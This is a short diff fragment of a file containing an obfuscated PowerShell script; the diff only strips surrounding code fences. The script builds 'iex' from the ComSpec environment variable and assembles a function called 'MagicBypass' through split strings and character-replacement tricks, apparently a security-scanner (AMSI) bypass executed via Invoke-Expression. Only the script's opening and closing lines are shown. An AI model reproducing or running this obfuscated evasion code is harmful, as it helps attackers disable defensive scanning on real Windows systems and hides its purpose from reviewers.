@@ -1,4 +1,3 @@
-```
 .( $env:ComspEc[4,24,25]-joIN'') ( (('function MagicBypass {
     param(
         jFCIni'+'tialStart = 0x50000,'+'
@@ -123,4 +122,3 @@ pu'+'blic class APIs {
     Write-Host 6wfjFCTim'+'eElapsed seconds6wf
 }
 ') -ReplacE'mry',[cHAr]39  -ReplacE([cHAr]54+[cHAr]119+[cHAr]102),[cHAr]34-cREplaCE'jFC',[cHAr]36 -cREplaCE  'V4j',[cHAr]124))
-```
